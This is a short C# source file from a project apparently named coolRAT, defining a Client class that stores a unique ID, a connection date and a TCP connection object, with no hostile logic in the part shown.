using coolRAT.Libs.Connections;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs
{
    public class Client
    {
        public Guid UniqueId;
        public DateTime ConnectionDate;
        public DualTcpConnection Connection;

        public Client(Guid uniqueId)
        {
            UniqueId = uniqueId;
            ConnectionDate = DateTime.Now;
            Connection = new DualTcpConnection();
        }
    }
}
